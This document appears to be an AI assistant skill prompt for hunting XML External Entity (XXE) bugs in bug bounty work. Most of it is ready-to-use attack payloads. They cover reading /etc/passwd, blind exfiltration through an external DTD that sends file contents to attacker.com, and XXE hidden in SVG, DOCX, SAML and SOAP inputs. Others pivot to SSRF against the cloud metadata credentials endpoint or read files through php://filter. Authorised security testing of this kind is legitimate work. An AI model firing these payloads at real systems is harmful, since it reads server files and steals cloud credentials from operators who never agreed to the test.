---
description: "XXE hunting methodology. TRIGGER: user is testing XML External Entity injection, blind XXE, SVG XXE, DOCX/XLSX/ODT XXE, SAML XXE, SOAP XXE, or XML-based file read / SSRF chains."
---

# /hunt-xxe - XML External Entity Injection Hunting

You are assisting **Liodeus (YesWeHack)**, whose XXE reports include SAML response XXE → file read, DOCX comment-stream XXE, SVG profile-picture XXE, and blind XXE via OOB DNS exfiltration. **XXE is rare in modern stacks but devastating where it lives** — usually in legacy XML parsers, document processors, or auth integrations.

## Core Philosophy

XXE is dying because XML is dying — but every modern app still has 2-3 XML entry points hidden behind file uploads (Office docs, SVG, EPUB, RSS, OPML), federated auth (SAML, WS-Fed), legacy APIs (SOAP, XML-RPC), and config import features. **Look for XML where users don't expect it.**

XXE = file read + SSRF + DoS, all in one. The DoS variant (billion laughs) is usually out-of-scope; focus on file read and SSRF.

## XXE Chains (from real reports)

### Chain 1: Direct XXE → file read
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
If the parser resolves entities and the response echoes XML content, `&xxe;` expands to `/etc/passwd`.

### Chain 2: Blind XXE → OOB exfiltration
When the response doesn't echo entities, exfil via DNS/HTTP:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
  %dtd;
]>
<root>&send;</root>
```
External DTD at `attacker.com/exfil.dtd`:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>">
%all;
```
You'll receive the file contents in your HTTP log (URL-encoded; works for files without newlines or use FTP/Java for binary).

### Chain 3: XXE via SVG upload
1. App accepts SVG (profile pic, icon upload, document conversion)
2. Backend renders SVG with libxml2 / Java SAX / .NET XmlReader
3. Embed XXE in SVG:
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```
4. Sometimes server processes SVG into PNG/PDF — entity content ends up in the rendered image (try both raw response inspection and rendered-output OCR)

### Chain 4: DOCX / XLSX / ODT / EPUB XXE
Office documents are zip files containing XML. Unzip, edit `word/document.xml` or `[Content_Types].xml`, re-zip:
```bash
unzip target.docx -d docx/
# edit docx/word/document.xml — add DOCTYPE with entity
# edit docx/[Content_Types].xml — same
zip -r evil.docx docx/
```
Common targets: any feature that ingests Office docs (resume parser, document converter, e-signature, doc preview).

### Chain 5: SAML / SSO XXE
1. Initiate SSO flow, capture the SAML AuthnRequest or Response
2. Inject XXE into the XML (often base64-encoded → decode, modify, re-encode)
3. The Identity Provider or Service Provider parses → file read
4. Many SAML libs were vulnerable historically: python-saml CVE-2017-11427, ruby-saml old versions, .NET SAML

### Chain 6: SOAP / XML-RPC XXE
Legacy SOAP endpoints often parse with permissive XML parsers:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><Login><user>&xxe;</user></Login></soap:Body>
</soap:Envelope>
```

### Chain 7: XXE → SSRF
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```
Use XXE as an SSRF primitive — but XXE-based SSRF can only do GET, no headers (so IMDSv2 won't work). Pivot to /hunt-ssrf for more.

### Chain 8: PHP-specific XXE (file read with binary)
PHP's `expect://` and `php://filter` work as entity URIs in some setups:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```
Base64-encodes binary files into a single line of XML-safe content.

## Discovery Methodology

### Step 1: Find every XML ingestion point
Direct:
* Endpoints with `Content-Type: application/xml`, `text/xml`, `application/soap+xml`
* SAML SSO: AuthnRequest, Response, LogoutRequest
* RSS/OPML/Atom imports
* Sitemap upload
* XML-RPC endpoints (`/xmlrpc.php` on WordPress targets)
* SOAP / WSDL endpoints

Indirect (XML hidden inside other formats):
* SVG image upload (anywhere images are accepted)
* DOCX / XLSX / PPTX / ODT / ODF document upload
* EPUB book upload
* Any "import config" / "import feed" feature
* Subscription file imports (.ics calendar, MARC bibliographic, etc.)

### Step 2: Detect XML parser behavior
For each XML endpoint, send a benign DOCTYPE first to detect parser:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test "TESTVALUE">]>
<root>&test;</root>
```
If response contains `TESTVALUE`, internal entities are expanded — XXE is plausible. If it contains `&test;` literal, entities are blocked.

### Step 3: Test external entity loading
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://collab.example.com/xxe-test">]>
<root>&xxe;</root>
```
Watch your collaborator. Hit = external entities load = XXE confirmed. From here, escalate to file read and OOB exfil.

### Step 4: For uploads, package correctly
SVG: just a text file, paste payload.
DOCX/XLSX: unzip, modify XML files, re-zip with same structure.
EPUB: similar zip-based.

Always test the rendered output — sometimes the entity expansion shows in the rendered PDF/image, sometimes in error messages, sometimes only via OOB.

### Step 5: Use parameter entities for blind
The `<!ENTITY % name "...">` form can chain through external DTDs to exfil. This is the only path on parsers that block "general entity" external references but allow "parameter entity" external DTDs.

## Common Parsers & Defaults (2026)

| Parser | Default for external entities | Notes |
|---|---|---|
| libxml2 (C, Python lxml, PHP) | DISABLED since 2.9.0 (2012) | Apps may explicitly re-enable |
| Java JAXP / SAX / DOM | DISABLED in modern JDK | Older code, apps using `XMLReaderFactory` directly often vulnerable |
| .NET XmlReader / XmlDocument | DISABLED in .NET 4.5.2+ | Old apps still vuln |
| Go encoding/xml | No entity support at all | Effectively immune |
| Node.js libxmljs / sax | DISABLED in defaults | App must opt-in to entities |
| Python ElementTree | DISABLED since 3.7.1 | defusedxml recommended |
| Ruby Nokogiri | DISABLED | Old REXML had issues |

**The exploitable cases are usually:** old code, custom parser config, or developer-disabled-the-default-protections.

## Impact Demonstration

* Show file read of a non-sensitive file first (`/etc/hostname`, `/etc/os-release`) for proof
* For sensitive files, capture path and show partial content (first line, byte count) — don't extract /etc/shadow in full
* For SSRF chain via XXE, show internal-only response
* Document the parser if identifiable (User-Agent on outbound, error messages, library fingerprints in stack traces)

## Key Considerations

* Modern XXE is largely on **uploads, federation, and legacy** — don't waste time on greenfield REST APIs
* Always test BOTH general entity (`<!ENTITY x SYSTEM ...>`) AND parameter entity (`<!ENTITY % x SYSTEM ...>`) — defenses often catch one but not the other
* For OOB, FTP exfil works for binary; HTTP/DNS for ASCII
* Java is the goldmine for XXE-style bugs in 2026 (Spring legacy, JBoss, WebSphere, lots of unmaintained internal apps)
* Billion laughs DoS is interesting but virtually never paid — mention impact, don't actually run it
* If the parser blocks `SYSTEM`, try `PUBLIC "id" "URL"`
* Read DTD files to find the parser's library by error fingerprints
